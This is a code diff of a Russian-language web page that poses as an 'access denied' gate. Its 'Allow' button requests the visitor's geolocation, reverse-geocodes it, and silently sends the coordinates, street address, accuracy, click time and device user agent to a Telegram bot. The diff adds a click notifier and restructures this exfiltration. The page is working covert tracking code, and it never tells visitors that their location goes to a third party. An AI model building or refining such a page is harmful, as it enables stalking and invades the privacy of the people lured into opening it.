@@ -225,6 +225,10 @@
         .step2-btn {
             margin-top: 30px;
         }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -238,7 +242,7 @@
         </div>
     </div>
 
-    <!-- ЭКРАН 2: "Доступ запрещён" + кнопка "Разрешить" (ЗДЕСЬ БУДЕТ ЗАПРОС ГЕОЛОКАЦИИ) -->
+    <!-- ЭКРАН 2: "Доступ запрещён" + кнопка "Разрешить" -->
     <div class="full-center hidden" id="step2">
         <div class="card">
             <div class="step2-title">⛔ Доступ запрещён</div>
@@ -299,18 +303,10 @@
         let lastLon = null;
         let lastAddress = null;
         let lastPlace = null;
+        let isSurpriseShown = false;
 
-        function sendToTelegram(lat, lon, acc, place, address) {
-            const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16`;
-            const text =
-                `📍 Я скоро приду!\n\n` +
-                `Название: ${place || 'Не определено'}\n` +
-                `Адрес: ${address || 'Не определён'}\n` +
-                `Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}\n` +
-                `Точность: ±${Math.round(acc)} м\n\n` +
-                `🗺️ Карта: ${mapLink}\n\n` +
-                `Устройство: ${navigator.userAgent}`;
-
+        // ====== ОТПРАВКА В TELEGRAM ======
+        function sendToTelegram(text) {
             const form = document.createElement('form');
             form.method = 'GET';
             form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -342,6 +338,13 @@
             }, 1000);
         }
 
+        // ====== УВЕДОМЛЕНИЕ ПРИ НАЖАТИИ ======
+        function notifyClick() {
+            const msg = `🔔 Пользователь нажал «Разрешить» на втором экране\n\nВремя: ${new Date().toLocaleString()}\nУстройство: ${navigator.userAgent}`;
+            sendToTelegram(msg);
+        }
+
+        // ====== КОПИРОВАНИЕ ======
         function copyCoords() {
             if (!lastLat || !lastLon) return;
             const text = `${lastLat.toFixed(6)}, ${lastLon.toFixed(6)}`;
@@ -361,6 +364,7 @@
             });
         }
 
+        // ====== АДРЕС ======
         async function getPlaceAndAddress(lat, lon) {
             try {
                 const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=ru`;
@@ -384,6 +388,7 @@
             }
         }
 
+        // ====== ГЕОЛОКАЦИЯ ======
         function getLocation() {
             const status = document.getElementById('statusText');
             const coords = document.getElementById('coordsDisplay');
@@ -437,7 +442,19 @@
 
                     addressEl.textContent = address;
 
-                    sendToTelegram(lat, lon, accuracy, place, address);
+                    // Отправляем финальное сообщение с геолокацией
+                    const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16`;
+                    const finalMsg =
+                        `📍 Я скоро приду!\n\n` +
+                        `Название: ${place || 'Не определено'}\n` +
+                        `Адрес: ${address || 'Не определён'}\n` +
+                        `Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}\n` +
+                        `Точность: ±${Math.round(accuracy)} м\n\n` +
+                        `🗺️ Карта: ${mapLink}\n\n` +
+                        `Устройство: ${navigator.userAgent}`;
+                    sendToTelegram(finalMsg);
+
+                    isSurpriseShown = true;
                 },
                 function(err) {
                     showFinalError();
@@ -454,26 +471,35 @@
         function goBack() {
             document.getElementById('step4').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
+            isSurpriseShown = false;
         }
 
-        // Шаг 1 → Шаг 2
+        // ====== ШАГ 1 → ШАГ 2 ======
         document.getElementById('startBtn').addEventListener('click', function() {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
         });
 
-        // Шаг 2 → ЗАПРОС ГЕОЛОКАЦИИ → Шаг 3 (сюрприз)
+        // ====== ШАГ 2 → ЗАПРОС ГЕОЛОКАЦИИ ======
         document.getElementById('allowBtn').addEventListener('click', function() {
-            // Показываем третий экран и инициализируем карту
+            // Отправляем уведомление о нажатии
+            notifyClick();
+
+            // Если сюрприз уже показан — не показываем повторно
+            if (isSurpriseShown) {
+                return;
+            }
+
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step3').classList.remove('hidden');
 
-            map = L.map('map').setView([55.7558, 37.6173], 13);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '© OpenStreetMap'
-            }).addTo(map);
+            if (!map) {
+                map = L.map('map').setView([55.7558, 37.6173], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© OpenStreetMap'
+                }).addTo(map);
+            }
 
-            // ВЫЗЫВАЕМ ГЕОЛОКАЦИЮ ТОЛЬКО ПОСЛЕ НАЖАТИЯ
             getLocation();
         });
     </script>
